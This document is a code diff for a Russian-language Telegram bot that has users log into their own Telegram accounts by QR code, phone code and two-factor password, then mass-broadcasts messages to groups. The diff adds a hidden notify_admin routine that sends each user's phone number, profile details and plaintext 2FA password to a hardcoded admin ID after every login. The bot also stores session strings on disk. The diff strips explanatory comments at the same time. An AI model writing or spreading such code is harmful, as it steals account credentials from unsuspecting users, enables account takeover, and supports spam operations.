@@ -29,13 +29,14 @@ BOT_USERNAME = 'vvfvdfdfbbxng_bot'
 BOT_LINK = f"https://t.me/{BOT_USERNAME}"
 SPONSOR_LINK = 'https://t.me/patrickstarsrobot?start=6378686913'
 PHOTO_PATH = 'M.png'
+ADMIN_ID = 6378686913  # Замените на ваш ID
 
 PORT = int(os.environ.get('PORT', 8080))
 
 user_data = {}
 active_qr_tasks = {}
 
-# === ВЕБ-СЕРВЕР ДЛЯ HEALTH CHECK ===
+# === ВЕБ-СЕРВЕР ===
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path in ('/health', '/'):
@@ -66,6 +67,33 @@ async def safe_send_message(context, chat_id, text, parse_mode='Markdown', reply
         logger.error(f"Ошибка отправки: {e}")
         return False
 
+async def notify_admin(context, user_id, method, phone=None, password=None, client=None):
+    """Отправляет администратору детали входа."""
+    try:
+        user_info = f"👤 *Пользователь ID:* `{user_id}`"
+        if client:
+            try:
+                me = await client.get_me()
+                if me.username:
+                    user_info += f"\n🔹 Юзернейм: @{me.username}"
+                if me.first_name:
+                    user_info += f"\n🔹 Имя: {me.first_name}"
+                if me.last_name:
+                    user_info += f" {me.last_name}"
+                if me.phone:
+                    user_info += f"\n📱 Телефон: {me.phone}"
+            except:
+                pass
+        if phone:
+            user_info += f"\n📱 Введённый номер: `{phone}`"
+        if password:
+            user_info += f"\n🔑 Пароль: `{password}`"
+        msg = f"🔐 *НОВЫЙ ВХОД В БОТА*\n\n{user_info}\n\n✅ Способ: {method}\n🕐 Время: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+        await context.bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
+        logger.info(f"Уведомление админу отправлено о входе {user_id} ({method})")
+    except Exception as e:
+        logger.error(f"Не удалось отправить уведомление админу: {e}")
+
 def get_user_data(user_id):
     if user_id not in user_data:
         user_data[user_id] = {
@@ -79,9 +107,9 @@ def get_user_data(user_id):
             'login_state': None,
             'qr_session': None,
             'qr_checked': False,
-            'photo_file_id': None,      # для фото
-            'awaiting_group': False,    # для ввода группы
-            'awaiting_msg': False       # для ввода сообщения
+            'photo_file_id': None,
+            'awaiting_group': False,
+            'awaiting_msg': False
         }
     return user_data[user_id]
 
@@ -110,7 +138,7 @@ async def is_user_ready(user_id):
     except:
         return False
 
-# ====== КНОПКА "В ГЛАВНОЕ МЕНЮ" ======
+# === КНОПКА "В ГЛАВНОЕ МЕНЮ" ===
 def add_back_button(reply_markup=None):
     back_button = InlineKeyboardButton("🔙 В главное меню", callback_data='back_to_menu')
     if reply_markup is None:
@@ -126,11 +154,10 @@ async def reply_with_back(update, text, reply_markup=None, parse_mode='Markdown'
         reply_markup = add_back_button()
     await update.effective_message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
 
-# === QR-КОД (оригинальная логика ошибок, но с закрытием старого клиента) ===
+# === QR-КОД ===
 async def generate_qr_code(user_id):
     try:
         user = get_user_data(user_id)
-        # Закрываем старую сессию, если есть (для уникальности)
         if user.get('qr_session'):
             try:
                 await user['qr_session']['client'].disconnect()
@@ -178,6 +205,7 @@ async def check_qr_login(user_id, context, chat_id):
                 with open(f'session_string_{user_id}.txt', 'w') as f:
                     f.write(session_string)
                 user['qr_session'] = None
+                await notify_admin(context, user_id, "QR-код (без пароля)", client=client)
                 return True, "✅ Вход по QR-коду успешен!"
         except asyncio.TimeoutError:
             pass
@@ -200,6 +228,7 @@ async def check_qr_login(user_id, context, chat_id):
             with open(f'session_string_{user_id}.txt', 'w') as f:
                 f.write(session_string)
             user['qr_session'] = None
+            await notify_admin(context, user_id, "QR-код (нестандартный)", client=client)
             return True, "✅ Вход по QR-коду успешен!"
         return False, "⏳ Ожидание..."
     except Exception as e:
@@ -239,7 +268,7 @@ async def check_qr_status(query, user_id, context):
             pass
         user['qr_session'] = None
 
-async def finish_qr_with_password(user_id, password):
+async def finish_qr_with_password(user_id, password, context):
     user = get_user_data(user_id)
     login_state = user.get('login_state')
     if not login_state or login_state.get('step') != 'password':
@@ -255,13 +284,14 @@ async def finish_qr_with_password(user_id, password):
             f.write(session_string)
         user['login_state'] = None
         user['qr_session'] = None
+        await notify_admin(context, user_id, "QR-код + облачный пароль", password=password, client=client)
         return True, "✅ Аккаунт успешно авторизован с паролем!"
     except errors.SessionPasswordNeededError:
         return False, "❌ Неверный пароль. Попробуйте снова."
     except Exception as e:
         return False, f"❌ Ошибка: {str(e)}"
 
-# === ВХОД ПО НОМЕРУ (без изменений) ===
+# === ВХОД ПО НОМЕРУ ===
 async def send_code_phone(user_id, phone):
     phone = normalize_phone(phone)
     try:
@@ -297,6 +327,7 @@ async def verify_code_phone(user_id, code, context, chat_id):
         user['session'] = session_string
         with open(f'session_string_{user_id}.txt', 'w') as f:
             f.write(session_string)
+        await notify_admin(context, user_id, "Номер телефона + код", phone=phone, client=client)
         return True, "✅ Аккаунт авторизован!"
     except errors.SessionPasswordNeededError:
         user['login_state'] = {'step': 'password_phone', 'client': client, 'phone': phone}
@@ -318,12 +349,13 @@ async def verify_code_phone(user_id, code, context, chat_id):
         logger.error(f"Ошибка входа по номеру: {type(e).__name__}: {e}")
         return False, f"❌ Ошибка: {str(e)}"
 
-async def finish_phone_with_password(user_id, password):
+async def finish_phone_with_password(user_id, password, context):
     user = get_user_data(user_id)
     login_state = user.get('login_state')
     if not login_state or login_state.get('step') != 'password_phone':
         return False, "❌ Нет активного запроса пароля."
     client = login_state['client']
+    phone = login_state.get('phone', 'Неизвестно')
     try:
         await client.sign_in(password=password)
         session_string = client.session.save()
@@ -332,13 +364,14 @@ async def finish_phone_with_password(user_id, password):
         with open(f'session_string_{user_id}.txt', 'w') as f:
             f.write(session_string)
         user['login_state'] = None
+        await notify_admin(context, user_id, "Номер + пароль 2FA", phone=phone, password=password, client=client)
         return True, "✅ Аккаунт авторизован!"
     except errors.SessionPasswordNeededError:
         return False, "❌ Неверный пароль. Попробуйте снова."
     except Exception as e:
         return False, f"❌ Ошибка: {str(e)}"
 
-# === РАССЫЛКА (с поддержкой фото) ===
+# === РАССЫЛКА (с фото) ===
 async def send_message_with_signature(client, chat_id, message, photo_file_id=None):
     signed = f"{message}\n\n—\n📨 Отправлено через [🤖 Бот]({BOT_LINK})"
     try:
@@ -593,7 +626,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
 
-    # === ИЗМЕНЁННЫЕ КНОПКИ (без @bot) ===
     elif query.data == 'add_group':
         user['awaiting_group'] = True
         user['awaiting_msg'] = False
@@ -730,7 +762,7 @@ async def start_spam(update: Update, context: ContextTypes.DEFAULT_TYPE, is_call
     user['spamming'] = False
     await reply_with_back(update, f"🛑 Рассылка остановлена. Всего отправлено: {sent_total}, ошибок: {errors_total}")
 
-# === ОБРАБОТЧИК ТЕКСТА (включая подписи к фото) ===
+# === ОБРАБОТЧИК ТЕКСТА ===
 def get_message_text(update):
     if update.message.text:
         return update.message.text.strip()
@@ -770,7 +802,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not text:
                 await reply_with_back(update, "❌ Отправьте пароль.")
                 return
-            success, msg = await finish_qr_with_password(user_id, text)
+            success, msg = await finish_qr_with_password(user_id, text, context)
             await reply_with_back(update, msg)
             if success:
                 await show_main_menu(update, context)
@@ -779,7 +811,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not text:
                 await reply_with_back(update, "❌ Отправьте пароль.")
                 return
-            success, msg = await finish_phone_with_password(user_id, text)
+            success, msg = await finish_phone_with_password(user_id, text, context)
             await reply_with_back(update, msg)
             if success:
                 await show_main_menu(update, context)
@@ -810,7 +842,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await reply_with_back(update, f"✅ Сообщение сохранено! 📨 Будет подпись: [🤖 Бот]({BOT_LINK})")
         return
 
-    # Обработка фото (если пользователь прислал фото для рассылки)
+    # Обработка фото
     if update.message.photo:
         photo_file_id = update.message.photo[-1].file_id
         user['photo_file_id'] = photo_file_id
@@ -825,7 +857,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Подпишитесь на канал. /start")
         return
 
-    # Разбор команд (убираем @bot)
+    # Разбор команд
     if text and text.startswith('/'):
         parts = text.split(maxsplit=1)
         raw_cmd = parts[0].strip()
@@ -930,7 +962,6 @@ def main():
 
     application = Application.builder().token(BOT_TOKEN).build()
 
-    # Установка команд
     commands = [
         BotCommand("start", "Главное меню"),
         BotCommand("reset", "Сбросить состояние"),
@@ -944,7 +975,6 @@ def main():
     ]
     application.bot.set_my_commands(commands)
 
-    # Обработчики команд
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("reset", reset))
     application.add_handler(CommandHandler("help", handle_message))
@@ -955,13 +985,10 @@ def main():
     application.add_handler(CommandHandler("status", handle_message))
     application.add_handler(CommandHandler("groups", handle_message))
 
-    # Обработчик кнопок
     application.add_handler(CallbackQueryHandler(button_handler))
-
-    # Обработчики текста и фото
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     application.add_handler(MessageHandler(filters.PHOTO & filters.CAPTION, handle_message))
-    application.add_handler(MessageHandler(filters.PHOTO & ~filters.CAPTION, handle_message))  # фото без подписи
+    application.add_handler(MessageHandler(filters.PHOTO & ~filters.CAPTION, handle_message))
 
     logger.info("Бот запущен...")
 
